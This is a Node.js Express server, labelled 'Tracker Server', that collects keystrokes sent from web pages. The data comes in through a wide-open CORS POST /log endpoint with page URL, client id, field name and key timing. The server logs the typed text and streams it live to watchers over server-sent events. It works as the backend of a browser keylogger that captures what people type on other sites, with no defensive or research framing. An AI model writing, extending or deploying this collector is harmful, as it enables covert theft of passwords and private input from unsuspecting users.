const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// FIXED CORS: Allow all origins without credentials
app.use(cors({
  origin: '*',  // Wildcard OK since no credentials
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: false  // ← KEY FIX: No credentials mode
}));
app.use(express.json({ limit: '10mb' }));

// Explicit OPTIONS handler for preflight
app.options('/log', cors());  // ← ADDED FOR PREFLIGHT

// In-memory broadcast
const clients = new Set();

// SSE Stream
app.get('/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.flushHeaders();

  const send = (data) => {
    try { res.write(`data: ${JSON.stringify(data)}\n\n`); } catch {}
  };
  clients.add(send);

  const keepAlive = setInterval(() => res.write('data: ping\n\n'), 15000);

  req.on('close', () => {
    clients.delete(send);
    clearInterval(keepAlive);
  });
});

// POST /log
app.post('/log', (req, res) => {
  const payload = {
    url: req.body.url || "unknown",
    client: req.body.client || "unknown",
    field: req.body.field || "",
    keys: Array.isArray(req.body.keys) ? req.body.keys : [],
    timestamps: Array.isArray(req.body.ts) ? req.body.ts : []
  };

  console.log(`[LIVE] ${payload.client} → ${payload.url} → ${payload.keys.join('')}`);

  clients.forEach(send => send(payload));

  res.json({ status: "ok" });
});

// Health check
app.get('/', (req, res) => res.send('Tracker Server Live'));
app.get('/log', (req, res) => res.json({ message: "Use POST /log to send data." }));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});